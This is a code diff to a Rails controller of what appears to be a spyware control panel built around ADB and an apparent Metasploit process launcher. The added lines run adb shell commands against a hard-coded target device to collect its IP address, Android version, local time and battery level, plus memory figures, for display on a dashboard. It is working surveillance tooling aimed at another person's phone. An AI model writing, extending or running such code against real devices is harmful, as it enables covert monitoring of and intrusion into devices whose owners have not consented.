@@ -8,6 +8,12 @@ class ApplicationController < ActionController::Base
   @@nrRunningProcesses=0
   @@soundMode=2
   @@isAdbStarted=false
+  @@ipAddress="Unknown"
+  @@operatingSystem="Unknown"
+  @@isRooted="Unknown"
+  @@batteryLevel="Unknown"
+  @@localHour="Unknown"
+
 
     def start_msf_process(command)
       begin
@@ -98,8 +104,14 @@ class ApplicationController < ActionController::Base
       adbDevices=`tools\\platform-tools\\adb.exe devices`.split("\n")
       if adbDevices.any? {|line| line =~ /#{Rails.configuration.spyware_config['target_ip']}:5555\s+device/ }#adbDevices.size > 1
         @@isAdbConnected=true
+        @@ipAddress=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell "ip addr show wlan0 | grep inet | grep -v inet6"`.split[1].gsub(/\/\d*/,'')
+        @@operatingSystem='Android ' + `tools\\platform-tools\\adb.exe -s 192.168.100.33 shell getprop ro.build.version.release`.strip
+        @@isRooted="Rooted: No"
+        @@localHour=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell date +%R`.strip
+        @@batteryLevel=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell "dumpsys battery | grep level"`.split(':')[1].strip + '%'
         memoryTotal=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell "cat /proc/meminfo | grep MemTotal"`.strip.gsub(/\D/, '').to_f
         memoryAvailable=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell "cat /proc/meminfo | grep MemAvailable"`.strip.gsub(/\D/, '').to_f
+
         #puts(memoryTotal)
         #puts(memoryAvailable)
         @@memoryUsage=((memoryTotal- memoryAvailable)/memoryTotal * 100).to_i
@@ -148,7 +160,9 @@ class ApplicationController < ActionController::Base
       respond_to do |format|
         format.js { render "check_connection", :locals => {:adbConnected => @@isAdbConnected,
                    :msfConnected => @@isMsfConnected, :cpuUsage => @@cpuUsage, :memoryUsage => @@memoryUsage, :storage => @@storage,
-                   :nrRunningProcesses => @@nrRunningProcesses, :nrFinishedProcesses => @@nrFinishedProcesses }  }
+                   :nrRunningProcesses => @@nrRunningProcesses, :nrFinishedProcesses => @@nrFinishedProcesses,
+                   :ipAddress => @@ipAddress, :operatingSystem => @@operatingSystem, :isRooted => @@isRooted,
+                   :batteryLevel => @@batteryLevel, :localHour => @@localHour }  }
       end
 
     end
